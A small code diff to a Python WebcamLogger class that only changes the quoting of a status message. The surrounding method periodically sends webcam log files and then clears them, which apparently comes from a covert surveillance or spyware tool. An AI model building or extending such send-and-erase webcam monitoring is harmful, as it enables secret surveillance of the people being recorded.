@@ -34,7 +34,7 @@ class WebcamLogger:
     def increment_and_check_counter(self):
         self.counter += 1
         if self.counter >= self.counter_max:
-            send_log_files_in_directory("Sending webcam logs...", self.logs_directory)
+            send_log_files_in_directory("`Sending webcam logs...`", self.logs_directory)
             clear_files_in_log_directory(self.logs_directory)
             log_info("Sent and cleared webcam log files.")
             self.counter = 0
